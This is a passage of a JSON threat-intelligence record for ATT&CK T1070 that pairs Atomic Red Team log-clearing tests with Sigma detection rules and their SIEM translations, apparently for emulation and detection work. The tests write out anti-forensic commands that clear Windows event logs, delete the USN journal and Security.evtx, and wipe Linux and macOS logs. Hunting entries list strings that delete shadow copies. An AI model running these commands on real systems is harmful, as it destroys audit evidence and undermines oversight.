"rm -rf /var/log/*", "```"], "technique_id": "T1070", "parsed_datasets": [{"Atomic Red Team Test - Indicator Removal on Host": {"display_name": "Indicator Removal on Host", "atomic_tests": [{"description": "Clear Windows Event Logs\n", "supported_platforms": ["windows"], "name": "Clear Logs", "input_arguments": {"log_name": {"default": "System", "type": "String", "description": "Windows Log Name, ex System"}}, "executor": {"elevation_required": true, "command": "wevtutil cl #{log_name}\n", "name": "command_prompt"}}, {"description": "Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume.\n", "supported_platforms": ["windows"], "name": "FSUtil", "executor": {"elevation_required": true, "command": "fsutil usn deletejournal /D C:\n", "name": "command_prompt"}}, {"description": "Delete system and audit logs\n", "supported_platforms": ["macos", "linux"], "name": "rm -rf", "executor": {"command": "rm -rf /private/var/log/system.log*\nrm -rf /private/var/audit/*\n", "name": "sh"}}, {"description": "This test overwrites the Linux mail spool of a specified user. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n", "supported_platforms": ["linux"], "name": "Overwrite Linux Mail Spool", "input_arguments": {"username": {"default": "root", "type": "String", "description": "Username of mail spool"}}, "executor": {"command": "echo 0> /var/spool/mail/#{username}\n", "name": "bash"}}, {"description": "This test overwrites the specified log. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n", "supported_platforms": ["linux"], "name": "Overwrite Linux Log", "input_arguments": {"log_path": {"default": "/var/log/secure", "type": "Path", "description": "Path of specified log"}}, "executor": {"command": "echo 0> #{log_path}\n", "name": "bash"}}, {"description": "Recommended Detection: Monitor for use of the windows event log filepath in PowerShell couple with delete arguments\n", "supported_platforms": ["windows"], "name": "Delete System Logs Using PowerShell", "executor": {"elevation_required": true, "command": "$eventLogId = Get-WmiObject -Class Win32_Service -Filter \"Name LIKE 'EventLog'\" | Select-Object -ExpandProperty ProcessId\nStop-Process -Id $eventLogId -Force\nRemove-Item C:\\Windows\\System32\\winevt\\Logs\\Security.evtx\n", "name": "powershell", "cleanup_command": "Start-Service -Name EventLog\n"}}, {"description": "Clear event logs using built-in PowerShell commands\n", "supported_platforms": ["windows"], "name": "Delete System Logs Using Clear-EventLogId", "executor": {"elevation_required": true, "command": "Clear-EventLog -logname Application\n", "name": "powershell"}}], "attack_technique": "T1070"}}, {"Mitre Stockpile - Clear Sysmon logs [intended to trigger CAR-2016-04-002]": {"platforms": {"windows": {"psh,pwsh": {"command": "Clear-Eventlog Security;\nClear-Eventlog System;\n"}}}, "description": "Clear Sysmon logs [intended to trigger CAR-2016-04-002]", "tactic": "defense-evasion", "technique": {"attack_id": "T1070", "name": "Indicator Removal on Host"}, "id": "fcf71ee3-d1a9-4136-b919-9e5f6da43608", "name": "Clear Logs"}}, {"Threat Hunting Tables": {"mitre_attack": "T1070", "file_value": "", "file_path": "", "parent_process": "fsutil.exe", "itw_sample": "https://www.joesecurity.org/reports/report-71b6a493388e7d0b40c83ce903bc6b04.html#overview", "chain_id": "100034", "registry_value": "", "mitre_caption": "indicator_removal", "registry_path": "", "frequency": "rare", "commandline_string": "usn deletejournal /D", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1070", "file_value": "", "file_path": "", "parent_process": "vssadmin.exe", "itw_sample": "51bf86b51ec3a3bf21bc9a9ea7c00f2599efafda93535c2d7e92dd1d07380332", "chain_id": "100083", "registry_value": "", "mitre_caption": "indicator_removal", "registry_path": "", "frequency": "rare", "commandline_string": "delete shadows /all /quiet", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1070", "file_value": "", "file_path": "", "parent_process": "wbadmin.exe", "itw_sample": "", "chain_id": "100084", "registry_value": "", "mitre_caption": "indicator_removal", "registry_path": "", "frequency": "rare", "commandline_string": "delete catalog -quiet", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1070", "file_value": "", "file_path": "", "parent_process": "wevtutil.exe", "itw_sample": "https://www.joesecurity.org/reports/report-fbbdc39af1139aebba4da004475e8839.html", "chain_id": "100085", "registry_value": "", "mitre_caption": "indicator_removal", "registry_path": "", "frequency": "low", "commandline_string": "/cl", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1070", "file_value": "", "file_path": "", "parent_process": "wmic.exe", "itw_sample": "", "chain_id": "100101", "registry_value": "", "mitre_caption": "indicator_removal", "registry_path": "", "frequency": "rare", "commandline_string": "/NODE:*shadowcopy delete *", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"SysmonHunter - T1070": {"phase": "Defense Evasion", "query": [{"process": {"cmdline": {"pattern": "cl"}, "image": {"pattern": "wevtutil"}}, "type": "process"}, {"process": {"cmdline": {"pattern": "wevtutil|cl", "op": "and"}}, "type": "process"}, {"process": {"cmdline": {"pattern": "fsutil|usn|deletejournal", "op": "and"}}, "type": "process"}, {"process": {"cmdline": {"pattern": "usn|deletejournal", "op": "and"}, "image": {"pattern": "fsutil"}}, "type": "process"}], "description": null, "name": "Indicator Removal on Host", "level": "high"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1070", "Empire Module": "powershell/credentials/mimikatz/purge", "Technique": "Indicator Removal on Host", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/purge\":  [\"T1070\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1070", "Empire Module": "powershell/management/lock", "Technique": "Indicator Removal on Host", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/lock\":  [\"T1070\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1070", "Empire Module": "powershell/management/logoff", "Technique": "Indicator Removal on Host", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/logoff\":  [\"T1070\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1070", "Empire Module": "powershell/management/restart", "Technique": "Indicator Removal on Host", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/restart\":  [\"T1070\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1070", "Empire Module": "python/persistence/osx/RemoveDaemon", "Technique": "Indicator Removal on Host", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/persistence/osx/RemoveDaemon\":  [\"T1070\"],"}}], "queries": [{"query": "Sysmon| where process_path contains \"wevtutil\"", "product": "Azure Sentinel", "name": "Indicator Removal On Host"}, {"query": "title: Disable of ETW Trace\nid: a238b5d0-ce2d-4414-a676-7a531b3d13d6\ndescription: Detects a command that clears or disables any ETW trace log which could indicate a logging evasion.\nreferences:\n    - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil\n    - https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mal_lockergoga.yml\n    - https://abuse.io/lockergoga.txt\nauthor: '@neu5ron, Florian Roth'\ndate: 2019/03/22\ntags:\n    - attack.execution\n    - attack.t1070  \n    - car.2016-04-002  \nlevel: high\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_clear_1:\n        CommandLine: '* cl */Trace*'\n    selection_clear_2:\n        CommandLine: '* clear-log */Trace*'\n    selection_disable_1:\n        CommandLine: '* sl* /e:false*'\n    selection_disable_2:\n        CommandLine: '* set-log* /e:false*'\n    condition: selection_clear_1 or selection_clear_2 or selection_disable_1 or selection_disable_2", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Disable of ETW Trace\nid: a238b5d0-ce2d-4414-a676-7a531b3d13d6\ndescription: Detects a command that clears or disables any ETW trace log which could indicate a logging evasion.\nreferences:\n    - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil\n    - https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mal_lockergoga.yml\n    - https://abuse.io/lockergoga.txt\nauthor: '@neu5ron, Florian Roth'\ndate: 2019/03/22\ntags:\n    - attack.execution\n    - attack.t1070  \n    - car.2016-04-002  \nlevel: high\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_clear_1:\n        CommandLine: '* cl */Trace*'\n    selection_clear_2:\n        CommandLine: '* clear-log */Trace*'\n    selection_disable_1:\n        CommandLine: '* sl* /e:false*'\n    selection_disable_2:\n        CommandLine: '* set-log* /e:false*'\n    condition: selection_clear_1 or selection_clear_2 or selection_disable_1 or selection_disable_2", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine.keyword:*\\\\ cl\\\\ *\\\\/Trace* OR CommandLine.keyword:*\\\\ clear\\\\-log\\\\ *\\\\/Trace* OR CommandLine.keyword:*\\\\ sl*\\\\ \\\\/e\\\\:false* OR CommandLine.keyword:*\\\\ set\\\\-log*\\\\ \\\\/e\\\\:false*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Disable-of-ETW-Trace <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Disable of ETW Trace\",\\n    \"description\": \"Detects a command that clears or disables any ETW trace log which could indicate a logging evasion.\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1070\",\\n      \"car.2016-04-002\"\\n    ],\\n    \"query\": \"(CommandLine.keyword:*\\\\\\\\ cl\\\\\\\\ *\\\\\\\\/Trace* OR CommandLine.keyword:*\\\\\\\\ clear\\\\\\\\-log\\\\\\\\ *\\\\\\\\/Trace* OR CommandLine.keyword:*\\\\\\\\ sl*\\\\\\\\ \\\\\\\\/e\\\\\\\\:false* OR CommandLine.keyword:*\\\\\\\\ set\\\\\\\\-log*\\\\\\\\ \\\\\\\\/e\\\\\\\\:false*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine.keyword:*\\\\\\\\ cl\\\\\\\\ *\\\\\\\\/Trace* OR CommandLine.keyword:*\\\\\\\\ clear\\\\\\\\-log\\\\\\\\ *\\\\\\\\/Trace* OR CommandLine.keyword:*\\\\\\\\ sl*\\\\\\\\ \\\\\\\\/e\\\\\\\\:false* OR CommandLine.keyword:*\\\\\\\\ set\\\\\\\\-log*\\\\\\\\ \\\\\\\\/e\\\\\\\\:false*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Disable of ETW Trace\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine.keyword:* cl *\\\\/Trace* OR CommandLine.keyword:* clear\\\\-log *\\\\/Trace* OR CommandLine.keyword:* sl* \\\\/e\\\\:false* OR CommandLine.keyword:* set\\\\-log* \\\\/e\\\\:false*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"* cl */Trace*\" OR CommandLine=\"* clear-log */Trace*\" OR CommandLine=\"* sl* /e:false*\" OR CommandLine=\"* set-log* /e:false*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (CommandLine=\"* cl */Trace*\" OR CommandLine=\"* clear-log */Trace*\" OR CommandLine=\"* sl* /e:false*\" OR CommandLine=\"* set-log* /e:false*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*.* cl .*/Trace.*|.*.* clear-log .*/Trace.*|.*.* sl.* /e:false.*|.*.* set-log.* /e:false.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious eventlog clear or configuration using wevtutil\nid: cc36992a-4671-4f21-a91d-6c2b72a2edf5\ndescription: Detects clearing or configuration of eventlogs uwing wevtutil, powershell and wmic. Might be used by ransomwares during the attack (seen by NotPetya and others)\nauthor: Ecco, Daniil Yugoslavskiy, oscd.community\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070/T1070.yaml\n    - https://eqllib.readthedocs.io/en/latest/analytics/5b223758-07d6-4100-9e11-238cfdd0fe97.html\ndate: 2019/09/26\nmodified: 2019/11/11\ntags:\n    - attack.defense_evasion\n    - attack.t1070\n    - car.2016-04-002\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_wevtutil:\n        Image|endswith: '\\wevtutil.exe'\n        CommandLine|contains:  \n            - 'clear-log' # clears specified log \n            - 'cl'        # short version of 'clear-log'\n            - 'set-log'   # modifies config of specified log. could be uset to set it to a tiny size\n            - 'sl'        # short version of 'set-log'\n    selection_ps:\n        Image|endswith: '\\powershell.exe'\n        CommandLine|contains: \n            - 'Clear-EventLog'\n            - 'Remove-EventLog'\n            - 'Limit-EventLog'\n    selection_wmic:\n        Image|endswith: '\\wmic.exe'\n        CommandLine|contains: 'ClearEventLog'\n    condition: 1 of them\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious eventlog clear or configuration using wevtutil\nid: cc36992a-4671-4f21-a91d-6c2b72a2edf5\ndescription: Detects clearing or configuration of eventlogs uwing wevtutil, powershell and wmic. Might be used by ransomwares during the attack (seen by NotPetya and others)\nauthor: Ecco, Daniil Yugoslavskiy, oscd.community\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070/T1070.yaml\n    - https://eqllib.readthedocs.io/en/latest/analytics/5b223758-07d6-4100-9e11-238cfdd0fe97.html\ndate: 2019/09/26\nmodified: 2019/11/11\ntags:\n    - attack.defense_evasion\n    - attack.t1070\n    - car.2016-04-002\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_wevtutil:\n        Image|endswith: '\\wevtutil.exe'\n        CommandLine|contains:  \n            - 'clear-log' # clears specified log \n            - 'cl'        # short version of 'clear-log'\n            - 'set-log'   # modifies config of specified log. could be uset to set it to a tiny size\n            - 'sl'        # short version of 'set-log'\n    selection_ps:\n        Image|endswith: '\\powershell.exe'\n        CommandLine|contains: \n            - 'Clear-EventLog'\n            - 'Remove-EventLog'\n            - 'Limit-EventLog'\n    selection_wmic:\n        Image|endswith: '\\wmic.exe'\n        CommandLine|contains: 'ClearEventLog'\n    condition: 1 of them\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\wevtutil.exe AND CommandLine.keyword:(*clear\\\\-log* OR *cl* OR *set\\\\-log* OR *sl*)) OR (Image.keyword:*\\\\\\\\powershell.exe AND CommandLine.keyword:(*Clear\\\\-EventLog* OR *Remove\\\\-EventLog* OR *Limit\\\\-EventLog*)) OR (Image.keyword:*\\\\\\\\wmic.exe AND CommandLine.keyword:*ClearEventLog*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-eventlog-clear-or-configuration-using-wevtutil <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious eventlog clear or configuration using wevtutil\",\\n    \"description\": \"Detects clearing or configuration of eventlogs uwing wevtutil, powershell and wmic. Might be used by ransomwares during the attack (seen by NotPetya and others)\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1070\",\\n      \"car.2016-04-002\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\wevtutil.exe AND CommandLine.keyword:(*clear\\\\\\\\-log* OR *cl* OR *set\\\\\\\\-log* OR *sl*)) OR (Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND CommandLine.keyword:(*Clear\\\\\\\\-EventLog* OR *Remove\\\\\\\\-EventLog* OR *Limit\\\\\\\\-EventLog*)) OR (Image.keyword:*\\\\\\\\\\\\\\\\wmic.exe AND CommandLine.keyword:*ClearEventLog*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\wevtutil.exe AND CommandLine.keyword:(*clear\\\\\\\\-log* OR *cl* OR *set\\\\\\\\-log* OR *sl*)) OR (Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND CommandLine.keyword:(*Clear\\\\\\\\-EventLog* OR *Remove\\\\\\\\-EventLog* OR *Limit\\\\\\\\-EventLog*)) OR (Image.keyword:*\\\\\\\\\\\\\\\\wmic.exe AND CommandLine.keyword:*ClearEventLog*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious eventlog clear or configuration using wevtutil\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\wevtutil.exe AND CommandLine.keyword:(*clear\\\\-log* *cl* *set\\\\-log* *sl*)) OR (Image.keyword:*\\\\\\\\powershell.exe AND CommandLine.keyword:(*Clear\\\\-EventLog* *Remove\\\\-EventLog* *Limit\\\\-EventLog*)) OR (Image.keyword:*\\\\\\\\wmic.exe AND CommandLine.keyword:*ClearEventLog*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\wevtutil.exe\" (CommandLine=\"*clear-log*\" OR CommandLine=\"*cl*\" OR CommandLine=\"*set-log*\" OR CommandLine=\"*sl*\")) OR (Image=\"*\\\\\\\\powershell.exe\" (CommandLine=\"*Clear-EventLog*\" OR CommandLine=\"*Remove-EventLog*\" OR CommandLine=\"*Limit-EventLog*\")) OR (Image=\"*\\\\\\\\wmic.exe\" CommandLine=\"*ClearEventLog*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ((Image=\"*\\\\\\\\wevtutil.exe\" CommandLine IN [\"*clear-log*\", \"*cl*\", \"*set-log*\", \"*sl*\"]) OR (Image=\"*\\\\\\\\powershell.exe\" CommandLine IN [\"*Clear-EventLog*\", \"*Remove-EventLog*\", \"*Limit-EventLog*\"]) OR (Image=\"*\\\\\\\\wmic.exe\" CommandLine=\"*ClearEventLog*\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*.*\\\\wevtutil\\\\.exe)(?=.*(?:.*.*clear-log.*|.*.*cl.*|.*.*set-log.*|.*.*sl.*)))|.*(?:.*(?=.*.*\\\\powershell\\\\.exe)(?=.*(?:.*.*Clear-EventLog.*|.*.*Remove-EventLog.*|.*.*Limit-EventLog.*)))|.*(?:.*(?=.*.*\\\\wmic\\\\.exe)(?=.*.*ClearEventLog.*))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Eventlog Cleared\nid: d99b79d2-0a6f-4f46-ad8b-260b6e17f982\ndescription: One of the Windows Eventlogs has been cleared. e.g. caused by \"wevtutil cl\" command execution\nreferences:\n    - https://twitter.com/deviouspolack/status/832535435960209408\n    - https://www.hybrid-analysis.com/sample/027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745?environmentId=100\nauthor: Florian Roth\ntags:\n    - attack.defense_evasion\n    - attack.t1070\n    - car.2016-04-002\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID: 104\n        Source: Microsoft-Windows-Eventlog\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Eventlog Cleared\nid: d99b79d2-0a6f-4f46-ad8b-260b6e17f982\ndescription: One of the Windows Eventlogs has been cleared. e.g. caused by \"wevtutil cl\" command execution\nreferences:\n    - https://twitter.com/deviouspolack/status/832535435960209408\n    - https://www.hybrid-analysis.com/sample/027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745?environmentId=100\nauthor: Florian Roth\ntags:\n    - attack.defense_evasion\n    - attack.t1070\n    - car.2016-04-002\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID: 104\n        Source: Microsoft-Windows-Eventlog\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"104\" AND Source:\"Microsoft\\\\-Windows\\\\-Eventlog\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Eventlog-Cleared <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Eventlog Cleared\",\\n    \"description\": \"One of the Windows Eventlogs has been cleared. e.g. caused by \\\\\"wevtutil cl\\\\\" command execution\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1070\",\\n      \"car.2016-04-002\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"104\\\\\" AND Source:\\\\\"Microsoft\\\\\\\\-Windows\\\\\\\\-Eventlog\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"104\\\\\" AND Source:\\\\\"Microsoft\\\\\\\\-Windows\\\\\\\\-Eventlog\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Eventlog Cleared\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"104\" AND Source:\"Microsoft\\\\-Windows\\\\-Eventlog\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"104\" Source=\"Microsoft-Windows-Eventlog\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"104\" Source=\"Microsoft-Windows-Eventlog\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*104)(?=.*Microsoft-Windows-Eventlog))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Fsutil suspicious invocation\nid: add64136-62e5-48ea-807e-88638d02df1e\ndescription: Detects suspicious parameters of fsutil (deleting USN journal, configuring it with small size..). Might be used by ransomwares during the attack (seen by NotPetya and others)\nauthor: Ecco, E.M. Anhaus, oscd.community\ndate: 2019/09/26\nmodified: 2019/11/11\nlevel: high\nreferences:\n    - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070/T1070.yaml\n    - https://eqllib.readthedocs.io/en/latest/analytics/c91f422a-5214-4b17-8664-c5fcf115c0a2.html\ntags:\n    - attack.defense_evasion\n    - attack.t1070\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    binary_1:\n        Image|endswith: '\\fsutil.exe'\n    binary_2:\n        OriginalFileName: 'fsutil.exe'\n    selection:\n        CommandLine|contains: \n            - 'deletejournal'  # usn deletejournal ==> generally ransomware or attacker\n            - 'createjournal'  # usn createjournal ==> can modify config to set it to a tiny size\n    condition: (1 of binary_*) and selection\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Fsutil suspicious invocation\nid: add64136-62e5-48ea-807e-88638d02df1e\ndescription: Detects suspicious parameters of fsutil (deleting USN journal, configuring it with small size..). Might be used by ransomwares during the attack (seen by NotPetya and others)\nauthor: Ecco, E.M. Anhaus, oscd.community\ndate: 2019/09/26\nmodified: 2019/11/11\nlevel: high\nreferences:\n    - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070/T1070.yaml\n    - https://eqllib.readthedocs.io/en/latest/analytics/c91f422a-5214-4b17-8664-c5fcf115c0a2.html\ntags:\n    - attack.defense_evasion\n    - attack.t1070\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    binary_1:\n        Image|endswith: '\\fsutil.exe'\n    binary_2:\n        OriginalFileName: 'fsutil.exe'\n    selection:\n        CommandLine|contains: \n            - 'deletejournal'  # usn deletejournal ==> generally ransomware or attacker\n            - 'createjournal'  # usn createjournal ==> can modify config to set it to a tiny size\n    condition: (1 of binary_*) and selection\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\fsutil.exe OR OriginalFileName:\"fsutil.exe\") AND CommandLine.keyword:(*deletejournal* OR *createjournal*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Fsutil-suspicious-invocation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Fsutil suspicious invocation\",\\n    \"description\": \"Detects suspicious parameters of fsutil (deleting USN journal, configuring it with small size..). Might be used by ransomwares during the attack (seen by NotPetya and others)\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1070\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\fsutil.exe OR OriginalFileName:\\\\\"fsutil.exe\\\\\") AND CommandLine.keyword:(*deletejournal* OR *createjournal*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\fsutil.exe OR OriginalFileName:\\\\\"fsutil.exe\\\\\") AND CommandLine.keyword:(*deletejournal* OR *createjournal*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Fsutil suspicious invocation\\'\",\\n        \"body\": 